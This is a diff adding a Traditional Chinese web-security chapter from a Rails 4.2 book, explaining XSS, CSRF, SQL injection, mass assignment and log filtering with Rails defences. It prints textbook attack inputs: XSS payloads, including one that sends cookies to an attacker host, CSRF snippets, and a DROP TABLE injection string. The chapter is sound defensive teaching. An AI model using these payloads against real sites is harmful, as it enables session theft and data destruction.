@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+		<title>Ruby on Rails 實戰聖經 | 網路安全</title>
+		<link rel="stylesheet" type="text/css" href="./style.css">
+		<link rel="canonical" href="https://ihower.tw/rails4/security.html">
+<body>
+<div class="container">
+    <div class="page_header">
+        <h1 class="logo"><a href="./index.html">Ruby on Rails 實戰聖經<span>使用 Rails 4.2 及 Ruby 2.1</span></a></h1>
+        <div class="search_box">
+            <form class="search" action="https://www.google.com/search">
+            <input type="hidden" value="ihower.tw/rails4" name="as_sitesearch">
+            <input class="search_field" type="text" value="" name="as_q">
+            <input class="search_btn" type="submit" value="Search">
+            </form>
+        </div>
+    </div>
+
+    <div class="notice">
+    <p class="inner info_bubble">
+      <a href="https://leanpub.com/ihower-rails-book">電子書</a>和簡體版本準備中。如果您有任何意見、鼓勵或勘誤，歡迎<a href="mailto:ihower@gmail.com">來信給我</a>，謝謝。
+    </p>
+    </div>
+
+    <div class="inner wrap">
+       <div class="sidebar">
+            <h3><a href="about.html">關於本書</a></h3>
+            <h3><a href="index.html">回首頁</a></h3>
+       </div>
+       <div class="content body">
+	      <h1 id="section">網路安全</h1>
+
+<blockquote>
+  <p>If you’re the smartest person in the room, you’re in the wrong room. - Unknown</p>
+</blockquote>
+
+<p>一旦你的網站要放到網際網路上，你就得接受被駭客攻擊的風險，小則倒站，大則使用者資料被竊取。而從網路設備、作業系統、網站伺服器、資料庫到應用程式，有高達<em>75%</em>的攻擊主要都發生在網站應用程式這一層，因此身為網站開發者的你，對於網路安全不能沒有基本的認識。</p>
+
+<p>所幸<em>Rails</em>本身就內建了許多安全機制，像是<em>SQL injection</em>、<em>XSS</em>和<em>CSRF</em>等，可以幫助我們防範常見的數種網路攻擊，這一章會介紹幾個網路安全上的防範重點。</p>
+
+<p>關於網路安全，有幾點觀念值得一提：</p>
+
+<ul>
+  <li>不像做功能有就有，沒有就沒有。網路安全只能說相對比較安全。</li>
+  <li>不需要花太多功夫，網站就可以有足夠的安全性。但是如果需要極高的安全需求，花費的成本才會大幅提昇。
+<em>安全性有時和使用性</em>(usability)*有時是衝突的，想要越高的安全性可能導致功能越難用(想想驗證碼吧)。這在設計上需要取捨。</li>
+  <li>安全性必須是設計軟體一開始就必須考量到</li>
+</ul>
+
+<p>當然，還有一項最重要的網路安全黃金守則：「千萬不要相信使用者輸入進來的資料」。使用者是邪惡的，他們會有不預期的操作和輸入不正常的資料。</p>
+
+<h2 id="xsscross-site-scripting">跨站腳本攻擊<em>XSS(Cross-Site Scripting)</em>
+</h2>
+
+<p><em>XSS</em>可說是網站界第一名常見的攻擊模式，惡意的使用者可以將腳本程式碼放在網頁上讓其他使用者執行，任何可以讓使用者輸入資料的網站，都必須小心這個問題。例如可以將以下的程式貼到網頁上：</p>
+
+<pre><code>&lt;script&gt;alert('HACK YOU!');&lt;/script&gt;
+&lt;img src=javascript:alert('HACK YOU!')&gt;
+&lt;table background="javascript:alert('HACK YOU!')"&gt;
+&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
+&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
+</code></pre>
+
+<p>當一般使用者瀏覽到這一頁時，就會跳出<em>alert</em>視窗，或是將敏感資料例如<em>cookie</em>內容傳給攻擊者。</p>
+
+<p>要防範這個問題的方法，就是要逸出使用者輸入的內容，例如將<code>&lt;script&gt;</code>變成<code>&amp;lt;script&amp;gt;</code>，使之顯示出來的時候不讓瀏覽器去執行。你可以會想只要逸出<code>&lt;script&gt;</code>就好了吧？這就錯了，請千萬不要嘗試建立黑名單過濾，你可以參觀<em><a href="http://ha.ckers.org/xss.html">XSS  Cheat Sheet</a></em>這個網站，就會知道有非常多形式可以讓瀏覽器去執行腳本程式。因此最簡單又保險的方式，就是全部逸出。這在<em>Rails 3</em>版本已經變成預設行為，任何<em>View</em>樣本的字串，都會做<em>HTML</em>溢出。</p>
+
+<p>如果你知道資料是安全的不要逸出，這時你要用<code>html_safe</code>或<code>raw</code>方法：</p>
+
+<pre><code>"&lt;p&gt;safe&lt;/p&gt;".html_safe
+# 或
+raw("&lt;p&gt;safe&lt;/p&gt;")
+</code></pre>
+
+<blockquote>
+  <p>在<em>Rails 3</em>之前不會自動逸出，因此在樣板中需要加<code>escapeHTML()</code>或<code>h()</code>方法。也因為很多人常常會忘記造成<em>XSS</em>漏洞，所以在<em>Rails 3</em>之後就改成預設逸出了。</p>
+</blockquote>
+
+<h3 id="html">如何開放使用者張貼<em>HTML</em>
+</h3>
+
+<p>但是有時候我們還是必須開放讓使用者可以張貼簡單的<em>HTML</em>內容，例如超連結、圖片、標題等等。這時候我們可以用白名單的作法，<em>Rails</em>提供了<code>sanitize()</code>方法可以過濾溢出。</p>
+
+<blockquote>
+  <p>即使使用<em>Textile</em>或<em>Markdown</em>語法，你還是必須過濾<em>HTML</em>標籤。</p>
+</blockquote>
+
+<h2 id="csrfcross-site-request-forgery">跨站偽造請求<em>CSRF(Cross-site request forgery)</em>
+</h2>
+
+<p><em>CSRF</em>是說攻擊者可以利用別人的權限去執行網站上的操作，例如刪除資料。例如，攻擊者張貼了以下腳本到網頁上：</p>
+
+<pre><code>&lt;img src="/posts/delete_all"&gt;
+</code></pre>
+
+<p>攻擊者自己當然是沒有權限可以執行”/posts/delete_all”這一頁，但是網站管理員有。當網站管理員看到這一頁時，瀏覽器就觸發了這個不預期的動作而把資料刪除。</p>
+
+<p>要防範<em>CSRF</em>，首先可以從區別<em>GET</em>和<em>POST</em>的<em>HTTP</em>請求開始。我們在路由一章提過：所有讀取、查詢性質操作，都應該用<em>GET</em>，而會修改或刪除到資料的，則要用<em>POST</em>、<em>PATCH/PUT</em>或<em>DELETE</em>。這樣的設計，就可以防止上面的惡意程式碼了，因為在瀏覽器中必須用表單<em>form</em>才能送出<em>POST</em>請求。</p>
+
+<p>不過，這樣還不夠。因為即使是<em>POST</em>，瀏覽器還是可能不經過你同意而自動發送出去，例如：</p>
+
+<pre><code>&lt;a href="http://www.harmless.com/" onclick="
+  var f = document.createElement('form');
+  f.style.display = 'none';
+  this.parentNode.appendChild(f);
+  f.method = 'POST';
+  f.action = 'http://www.example.com/account/destroy';
+  f.submit();
+  return false;"&gt;To the harmless survey&lt;/a&gt;
+</code></pre>
+
+<p>所幸，<em>Rails</em>內建了<em>CSRF</em>防禦功能，也就是所有的<em>POST</em>請求，都必須加上一個安全驗證碼。在<em>app/controllers/application_controller.rb</em>你會看到以下程式啟用這個功能：</p>
+
+<pre><code>class ApplicationController &lt; ActionController::Base
+  protect_from_forgery with: :exception
+end
+</code></pre>
+
+<p>這個功能會在所有的表單中自動插入安全驗證碼：</p>
+
+<pre><code>&lt;form action="/projects/1" class="edit_project" enctype="multipart/form-data" id="edit_project_1" method="post"&gt;
+    &lt;div style="margin:0;padding:0;display:inline"&gt;
+    &lt;input name="_method" type="hidden" value="patch" /&gt;
+    &lt;input name="authenticity_token" type="hidden" value="cuI+ljBAcBxcEkv4pbeqLTEnRUb9mUYMgfpkwOtoyiA=" /&gt;
+&lt;/div&gt;
+</code></pre>
+
+<p>如果<em>POST</em>請求沒有帶正確的驗證碼，<em>Rails</em>就會丟出一個<code>ActionController:InvalidAuthenticityToken</code>的錯誤。</p>
+
+<blockquote>
+  <p><em>Layout</em>中也有一段<code>&lt;%= csrf_meta_tags %&gt;</code>是給<em>JavaScript</em>讀取驗證碼用的。</p>
+</blockquote>
+
+<h2 id="sql-injection">
+<em>SQL injection</em>注入攻擊</h2>
+
+<p><em>SQL injection</em>注入是說攻擊者可以輸入任意的<em>SQL</em>讓網站執行，這可說是最有殺傷力的攻擊。如果你寫出以下這種直接把輸入放在<em>SQL</em>條件中的程式：</p>
+
+<pre><code>Project.where("name = '#{params[:name]}'")
+</code></pre>
+
+<p>那麼使用者只要輸入：</p>
+
+<pre><code>x'; DROP TABLE users; --
+</code></pre>
+
+<p>最後執行的<em>SQL</em>就會變成</p>
+
+<pre><code>SELECT * FROM projects WHERE name = 'x'; DROP TABLE users; --’
+</code></pre>
+
+<p>其中的<code>;</code>結束了第一句，第二句<code>DROP TABLE users;</code>就讓你欲哭無淚。</p>
+
+<blockquote>
+  <p><em>Exploits of a Mom</em><a href="http://xkcd.com/327/">http://xkcd.com/327/</a></p>
+</blockquote>
+
+<p>要處理這個問題，也是一樣要對任何有包括使用者輸入值的<em>SQL</em>語句做逸出。在<em>Rails ActiveRecord</em>的<em>where</em>方法中使用<em>Hash</em>或<em>Array</em>寫法就會幫你處理，所以請一定都用這種寫法，而不要使用上述的字串參數寫法：</p>
+
+<pre><code>Project.where( { :name =&gt; params[:name] } )
+# or
+Project.where( ["name = ?", params[:name] ] )
+</code></pre>
+
+<p>如果你有用到以下的方法，<em>ActiveRecord</em>是不會自動幫你逸出，要特別注意：</p>
+
+<ul>
+  <li>find_by_sql</li>
+  <li>execute</li>
+  <li>where 用字串參數</li>
+  <li>group</li>
+  <li>order</li>
+</ul>
+
+<p>你可以自定一些固定的參數，並檢查使用者輸入的資料，例如：</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  def self.find_live_by_order(order)
+    raise "SQL Injection Warning" unless ["id","id desc"].include?(order)
+    where( :status =&gt; "live" ).order(order)
+  end
+end
+</code></pre>
+
+<p>或是手動呼叫<code>ActiveRecord::Base::connection.quote</code>方法：</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  def self.find_live_by_order(order)
+    where( :status =&gt; "live" ).order( connection.quote(order) )
+  end
+end
+</code></pre>
+
+<h2 id="mass-assignment">大量賦值(Mass assignment)</h2>
+
+<p><em>Mass assignemet</em>是個<em>Rails</em>專屬，因為太方便而造成的安全性議題。<em>ActiveRecord</em>物件在新建或修改時，可以直接傳入一個<em>Hash</em>來設定屬性(這功能叫做<em>Mass assignment</em>)，所以我們可以直接將網頁表單上的參數直接丟進放進去：</p>
+
+<pre><code>def create
+  # 假設表單送出 params[:user] 參數是
+  # {:name =&gt; “ihover”, :email =&gt; "ihover@gmail.com", :is_admin =&gt; true}
+
+  @user = User.create(params[:user])
+end
+
+def update
+  @user = User.update(params[:user])
+end
+</code></pre>
+
+<p>但是這個<em>Model</em>包含一些敏感屬性，例如此例中<em>is_admin</em>是個辨別是否是管理員的<em>Boolean</em>值，惡意的使用者可以直接修改<em>HTML</em>表單送出<code>is_admin=true</code>，造成了安全上的漏洞，所以以上的程式實際上會出現<code>ActiveModel::ForbiddenAttributesError</code>的安全錯誤訊息。</p>
+
+<p>為了解決這個問題，<em>Rails</em>使用了<em><a href="https://github.com/rails/strong_parameters">Strong Parameters</a></em>的機制來檢查<code>params</code>參數必須經過檢查才可以做<em>Mass assignment</em>，例如上述的程式必須改成：</p>
+
+<pre><code>def create
+  @user = User.create(user_params)
+end
+
+def update
+  @user = User.update(user_params)
+end
+
+protected
+
+def user_params
+    params.require(:user).permit(:name, :email)
+end
+</code></pre>
+
+<p>這樣才可以一次賦值<code>name</code>和<code>email</code>。</p>
+
+<p>當然，如果你沒有<em>Mass assignment</em>的需求，大可不必用到<em>Strong Parameters</em>技巧，例如以下的程式也是可以運作的：</p>
+
+<pre><code>def create
+  @user = User.create( :name =&gt; params[:user][:name], :email =&gt; params[:user][:email] )
+end
+</code></pre>
+
+<h2 id="symbolize-">Symbolize 問題</h2>
+
+<p><em>symbol</em>是<em>Ruby</em>中常用的型態，相較於字串可以獲得更好的執行效率，其佔用記憶體較少，但其特性是不會被<em>GC(garbage collection)</em>記憶體回收的。因此只適合程式內部有限的情況中使用，而不要將使用者可以任意輸入的參數做<em>symbol</em>化，例如：</p>
+
+<pre><code>if params[:category].to_sym == :first # 此例直接比較字串即可 params[:category] == "first"
+   # do something
+end
+</code></pre>
+
+<p>這樣為什麼會有安全性問題呢？這是因為如果惡意的使用者不斷送出任意字元進行<em>DoS(Denial of service attack)</em>攻擊，那麼程式就會不斷把<code>params[:category]</code>做<em>symbolize</em>，產生無法回收的記憶體，進而把記憶體全部用光。</p>
+
+<h2 id="section-1">不受限的資訊查詢</h2>
+
+<p>當你需要根據使用者傳進來的<code>params[:id]</code>做資料查詢的時候，你需要注意查詢的範圍，例如以下是找訂單：</p>
+
+<pre><code>  def show
+    @order = Order.find(params[:id])
+  end
+</code></pre>
+
+<p>使用者只要隨意變更<code>params[:id]</code>，就可以查到別人的訂單，你可能會寫出以下的程式來防範：</p>
+
+<pre><code>def show
+  @order = Order.find(params[:id])
+  if @order.user_id != current_user.id
+    render :text =&gt; "你沒有權限"
+    return
+  end
+end
+</code></pre>
+
+<p>不過這是多餘的寫法，你其實只要透過<em>ActiveRecord</em>限定範圍即可：</p>
+
+<pre><code>  def show
+    @order = current_user.orders.find(params[:id])
+  end
+</code></pre>
+
+<p>這樣如果沒權限，就會變成找不到資料而已。</p>
+
+<h2 id="section-2">敏感資訊處理</h2>
+
+<p>網站的敏感資訊，例如密碼、信用卡卡號等，請不要存在以下空間：</p>
+
+<ul>
+  <li>cookie</li>
+  <li>session</li>
+  <li>flash</li>
+  <li>長時間放在記憶體中</li>
+  <li>
+<em>Log</em>檔案</li>
+  <li>快取</li>
+</ul>
+
+<p>其中<em>Rails</em>內建了<em>log</em>敏感資訊過濾的功能，在<em>config/initializers/filter_parameter_logging.rb</em>有一行這樣的設定：</p>
+
+<pre><code>Rails.application.config.filter_parameters += [:password]
+</code></pre>
+
+<p>假設移除這一行，當使用者註冊時輸入密碼，<em>Log</em>檔案就會記錄：</p>
+
+<pre><code>Processing UsersController#create (for 127.0.0.1 at 2009-01-02 10:13:13) [POST]
+Parameters: {"user"=&gt;{"name"=&gt;"eifion", "password_confirmation"=&gt;"secret", "password"=&gt;"secret"},     "commit"=&gt;"Register", "authenticity_token"=&gt;"9efc03bcc37191d8a6dc3676e2e7890ecdfda0b5"}
+</code></pre>
+
+<p>其中的原始<em>password</em>就會被記錄下來的，非常地不好。如果套用上述的設定，<em>Rails</em>則會過濾成：</p>
+
+<pre><code>Processing UsersController#create (for 127.0.0.1 at 2009-01-02 11:02:33) [POST]
+Parameters: {"user"=&gt;{"name"=&gt;"susan", "password_confirmation"=&gt;"[FILTERED]", "password"=&gt;"[FILTERED]"}, "commit"=&gt;"Register", "action"=&gt;"create", "authenticity_token"=&gt;"9efc03bcc37191d8a6dc3676e2e7890ecdfda0b5", "controller"=&gt;"users"}
+</code></pre>
+
+<p>這樣就毫無記錄了。</p>
+
+<h2 id="section-3">投影片</h2>
+
+<ul>
+  <li><a href="http://www.slideshare.net/ihower/rails-security-3299368">Rails Security Best Practices</a></li>
+</ul>
+
+<h2 id="section-4">其他線上資源</h2>
+
+<ul>
+  <li><a href="http://guides.rubyonrails.org/security.html">Ruby On Rails Security Guide</a></li>
+  <li><a href="http://www.owasp.org/">The Open Web Application Security Project</a></li>
+</ul>
+
+        <p><a href="#">》回到頁首</a></p>
+	     </div>
+	</div>
+</div>
+
+<div class="footer">
+<div class="container">
+<p>
+<a href="https://ihower.tw/rails4/">Ruby on Rails 實戰聖經</a> | Copyright©2014 <a href="https://ihower.tw">Wen-Tien Chang</a>. All Rights Reserved.<br>
+除投影片使用<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/tw/">創用 CC 授權</a>釋出，文字及圖片等內容保留所有權利。<br>
+本網頁樣式來自 <a href="http://guide.couchdb.org/">CouchDB: The Definitive Guide</a>。<br>
+本網頁最後產生時間：04 Jan 2015
+</p>
+</div>
+</div>
+</body>
+</html>
